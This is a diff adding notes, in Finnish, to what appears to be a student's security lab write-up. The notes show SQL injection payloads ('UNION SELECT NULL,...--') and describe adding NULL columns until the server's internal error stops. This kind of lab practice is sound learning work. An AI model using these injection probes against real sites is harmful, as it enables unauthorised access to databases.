@@ -189,3 +189,24 @@ Kirjauduin tiedoilla MY account
 
 
 h.)
+
+Katsoin läpikävelyn kyseisestä tehtävästä.
+
+'UNION+SELECT+NULL,NULL--
+
+
+internal server error
+
+Lisäsin NULL niin kauan, että ei tullut erroria.
+
+'UNION+SELECT+NULL,NULL,NULL,NULL--
+
+
+![Screenshot 2023-11-25 at 13 38 10](https://github.com/AkiAleksi/h5/assets/112399816/fcbcb7f7-1bb3-4f1f-a7af-4aa00c957c6a)
+
+
+
+
+
+
+![Screenshot 2023-11-25 at 13 34 49](https://github.com/AkiAleksi/h5/assets/112399816/5f0a0222-1079-415b-9746-a702579cc0c6)
